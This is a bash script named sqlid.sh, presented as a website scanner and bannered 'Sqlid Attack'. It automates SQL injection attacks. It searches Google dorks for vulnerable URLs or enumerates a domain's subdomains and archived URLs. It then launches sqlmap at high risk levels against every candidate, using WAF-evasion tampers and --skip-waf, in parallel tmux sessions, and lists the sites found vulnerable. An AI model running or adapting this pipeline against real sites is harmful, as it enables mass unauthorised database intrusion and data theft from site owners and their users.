#!/bin/bash


# Author: NotZam

# sqlid.sh
#
# An Awesome Website Scanner
#


#spinner function

function _spinner() {
    # $1 start/stop
    #
    # on start: $2 display message
    # on stop : $2 process exit status
    #           $3 spinner function pid (supplied from stop_spinner)

    local on_success="DONE"
    local on_fail="FAIL"
    local white="\e[1;37m"
    local green="\e[1;32m"
    local red="\e[1;31m"
    local nc="\e[0m"

    case $1 in
        start)
            # calculate the column where spinner and status msg will be displayed
            let column=$(tput cols)-${#2}-8
            # display message and position the cursor in $column column
            echo -ne ${2}
            printf "%${column}s"

            # start spinner
            i=1
            sp='\|/-'
            delay=${SPINNER_DELAY:-0.15}

            while :
            do
                printf "\b${sp:i++%${#sp}:1}"
                sleep $delay
            done
            ;;
        stop)
            if [[ -z ${3} ]]; then
                echo "spinner is not running.."
                exit 1
            fi

            kill $3 > /dev/null 2>&1

            # inform the user uppon success or failure
            echo -en "\b["
            if [[ $2 -eq 0 ]]; then
                echo -en "${green}${on_success}${nc}"
            else
                echo -en "${red}${on_fail}${nc}"
            fi
            echo -e "]"
            ;;
        *)
            echo "invalid argument, try {start/stop}"
            exit 1
            ;;
    esac
}

function start_spinner {
    # $1 : msg to display
    _spinner "start" "${1}" &
    # set global spinner pid
    _sp_pid=$!
    disown
}

function stop_spinner {
    # $1 : command exit status
    _spinner "stop" $1 $_sp_pid
    unset _sp_pid
}










#program start
banner Sqlid Attack;
echo "0 : Result vulnerable Website"
echo "1 : Vulnerable Dork"
echo "2 : Domain Attack (warning: tua menunggu)"
echo "3 : Single attack"
read -p "Select attack type :" att
if [ $att != 0 ] && [ $att -lt 4 ]
then
echo "Enter Target (domain) [url for single attack]: "
read target


#udork
sqli=$target
sqli+="sqli.txt"

#amass
newdir=$target 
sub=$target
sub+="sub.txt"
brute=$target
brute+="brute.txt"

#udork 
 if [ $att -eq 1 ]
 then

 url=$target
 udork $url -f dork -p 100 -vv | grep -i "=" | grep -i "^h" | tee /tmp/$sqli
 sqlmap -m /tmp/$sqli --random-agent --level 3 --risk 3 --batch --answer "follow=N" --tamper="space2comment,xforwardedfor"
# rm -f /tmp/$sqli



#amass

 elif [ $att -eq 2 ]
 then


mkdir /tmp/$newdir
#Subdomain searching using amass

start_spinner 'scanning subdomain ' 	
amass enum -brute -min-for-recursive 2 -d $target >> tee  /tmp/$newdir/$sub ;
stop_spinner $? 

#httpx process

start_spinner 'httpx process in progress' 
cat  /tmp/$newdir/$sub | httpx -silent | anew >> /tmp/$newdir/httpx.txt
stop_spinner $? 

#pairing with gf pattern

start_spinner 'Pairing waybackurls process in progress' 
cat /tmp/$newdir/httpx.txt | waybackurls | gf sqli | unew -combine  >> /tmp/$newdir/$brute
stop_spinner $? 

#split result
start_spinner 'Multi Threads process in progress' 
count=$(cat /tmp/$newdir/$brute | wc -l)
vsplit=$((( $count / 8 )+ ($count % 8 > 0)))
last=$vsplit
increment=$vsplit
start=1
ttarget=${target//./}
tmux new -d -s $ttarget
for(( c=1; c<=8; c++ ))
do
br=$c
webarg=$target
webarg1=${target//./}
webarg1+=$br
webarg+=$br
echo $last
last+="p"

#create new session

tmux new-window -t $ttarget:$c -n $webarg1	
sed -n $start,$last /tmp/$newdir/$brute |tee /tmp/$webarg

#create multiple window

tmux send -t $ttarget:$webarg1 'sqlmap -m /tmp/'$newdir'/'$webarg' --random-agent  --level 3 --risk 3 --batch --answer "follow=N" --tamper="between,randomcase,space2comment,xforwardedfor" -v3 --skip-waf' ENTER




 
start=$(($start+$vsplit))
last=${last::-1}
last=$(($last+$vsplit))
webarg=${webarg::-1}

done
stop_spinner $? 




#rm -f /tmp/$sub
# rm -f /tmp/$brute

#single_attack
 elif [ $att -eq 3 ]
 then
 sqlmap -u $target --random-agent --level 1 --risk 3 --batch --answer "follow=N" --tamper="space2comment,xforwardedfor"
 else
echo "mampus"
 fi 

elif [ $att -eq 0 ]
 then
cat ~/.local/share/sqlmap/output/results* | stdbuf -o0 grep -vE 'Target|unexploitable'
else
echo "exit"
exit 1
fi
